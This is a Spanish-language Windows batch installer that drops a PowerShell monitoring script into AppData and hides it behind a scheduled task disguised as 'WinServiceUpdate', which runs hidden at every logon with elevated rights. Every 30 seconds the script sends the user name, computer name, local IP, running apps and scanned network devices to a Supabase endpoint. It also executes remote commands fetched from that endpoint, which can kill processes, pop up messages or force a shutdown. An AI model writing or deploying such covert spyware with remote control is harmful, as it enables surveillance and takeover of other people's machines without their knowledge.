@echo off
setlocal enabledelayedexpansion
title INSTALADOR TACTICO V10

set /p ALIAS_PC="Introduce el ALIAS para esta PC: "
set TARGET_DIR=%APPDATA%\WinServiceUpdate
set PS_FILE=%TARGET_DIR%\monitor.ps1
set URL_LOGS=https://empkipdihlmmumwvzkyd.supabase.co/rest/v1/log_monitoreo
set URL_CMDS=https://empkipdihlmmumwvzkyd.supabase.co/rest/v1/comandos_remotos
set API_KEY=sb_publishable_Bhk6iFwEBWSpeFJCHfb_Sg__UDavlUj

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

:: Escribir el nuevo monitor.ps1 con soporte para comandos
echo $alias = '%ALIAS_PC%' > "%PS_FILE%"
echo $url = '%URL_LOGS%' >> "%PS_FILE%"
echo $url_cmds = '%URL_CMDS%' >> "%PS_FILE%"
echo $apiKey = '%API_KEY%' >> "%PS_FILE%"
echo $headers = @{ 'apikey' = $apiKey; 'Authorization' = "Bearer $apiKey"; 'Content-Type' = 'application/json' } >> "%PS_FILE%"
echo while($true) { >> "%PS_FILE%"
echo     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss" >> "%PS_FILE%"
echo     $ipData = ipconfig ^| Select-String "IPv4" ^| Select-String "192.168." >> "%PS_FILE%"
echo     $ip = if ($ipData) { ($ipData.ToString().Split(':')[-1]).Trim() } else { "127.0.0.1" } >> "%PS_FILE%"
echo     $redBase = $ip.Substring(0, $ip.LastIndexOf('.')) >> "%PS_FILE%"
echo     1..5 ^| ForEach-Object { Test-Connection -ComputerName "$redBase.$_" -Count 1 -Quiet -ErrorAction SilentlyContinue } >> "%PS_FILE%"
echo     $dispositivos = arp -a ^| Select-String "$redBase\." ^| ForEach-Object { >> "%PS_FILE%"
echo         if ($_ -match 'din') { >> "%PS_FILE%"
echo             $cols = $_.ToString().Trim() -split '\s+' >> "%PS_FILE%"
echo             if ($cols.Count -ge 2) { $cols[0] + ' [' + $cols[1] + ']' } >> "%PS_FILE%"
echo         } >> "%PS_FILE%"
echo     } >> "%PS_FILE%"
echo     $redString = $dispositivos -join ' ^| ' >> "%PS_FILE%"
echo     $apps = (Get-Process ^| Where-Object { $_.MainWindowTitle } ^| Select-Object -ExpandProperty ProcessName -Unique) -join ', ' >> "%PS_FILE%"
echo     $payloadLog = @{ nombre_equipo = $env:COMPUTERNAME; alias_pc = $alias; usuario_pc = $env:USERNAME; ip_local = $ip; datos_actividad = @{ apps = $apps; red = $redString; hora = $timestamp } } ^| ConvertTo-Json -Compress >> "%PS_FILE%"
echo     try { Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $payloadLog -ContentType "application/json" } catch { } >> "%PS_FILE%"
echo     try { >> "%PS_FILE%"
echo         $check = Invoke-RestMethod -Uri "$($url_cmds)?alias_pc=eq.$alias&ejecutado=eq.false" -Method Get -Headers $headers >> "%PS_FILE%"
echo         if ($check) { >> "%PS_FILE%"
echo             foreach ($cmd in $check) { >> "%PS_FILE%"
echo                 switch ($cmd.accion) { >> "%PS_FILE%"
echo                     'CERRAR_APPS' { Get-Process ^| Where-Object { $_.MainWindowTitle -and $_.ProcessName -ne 'explorer' } ^| Stop-Process -Force } >> "%PS_FILE%"
echo                     'CERRAR_PROCESO' { Stop-Process -Name $cmd.payload -Force -ErrorAction SilentlyContinue } >> "%PS_FILE%"
echo                     'MENSAJE' { msg * /TIME:30 "$($cmd.payload)" } >> "%PS_FILE%"
echo                     'APAGAR' { shutdown /s /t 30 /f /c "Apagado remoto iniciado" } >> "%PS_FILE%"
echo                 } >> "%PS_FILE%"
echo                 $idC = $cmd.id >> "%PS_FILE%"
echo                 Invoke-RestMethod -Uri "$($url_cmds)?id=eq.$idC" -Method Patch -Headers $headers -Body (@{ejecutado=$true} ^| ConvertTo-Json) >> "%PS_FILE%"
echo             } >> "%PS_FILE%"
echo         } >> "%PS_FILE%"
echo     } catch { } >> "%PS_FILE%"
echo     Start-Sleep -Seconds 30 >> "%PS_FILE%"
echo } >> "%PS_FILE%"

taskkill /f /im powershell.exe >nul 2>&1
schtasks /delete /tn "WinServiceUpdate" /f >nul 2>&1
schtasks /create /tn "WinServiceUpdate" /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File '%PS_FILE%'" /sc onlogon /rl highest /f
schtasks /run /tn "WinServiceUpdate"

echo INSTALACION V10 COMPLETADA.
pause